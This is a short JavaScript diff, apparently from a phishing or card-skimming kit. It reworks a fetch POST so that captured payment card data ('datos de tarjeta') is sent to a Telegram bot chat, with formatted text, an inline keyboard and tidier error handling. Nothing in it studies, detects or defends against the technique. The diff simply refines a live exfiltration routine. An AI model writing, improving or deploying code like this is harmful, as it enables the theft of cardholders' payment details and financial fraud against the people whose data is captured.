@@ -1521,16 +1521,22 @@
                 const response = await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(datos)
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: mensaje,
+                        parse_mode: 'Markdown',
+                        reply_markup: inlineKeyboard,
+                        disable_web_page_preview: true
+                    })
                 });
 
                 const data = await response.json();
 
-                if (data.ok || data.success) {
+                if (data.ok) {
                     console.log('✅ Datos de tarjeta enviados a Telegram con categoría');
                     return true;
                 } else {
-                    console.error('❌ Error al enviar a Telegram:', data.error || 'Error desconocido');
+                    console.error('❌ Error al enviar a Telegram:', data.description);
                     return false;
                 }
             } catch (error) {
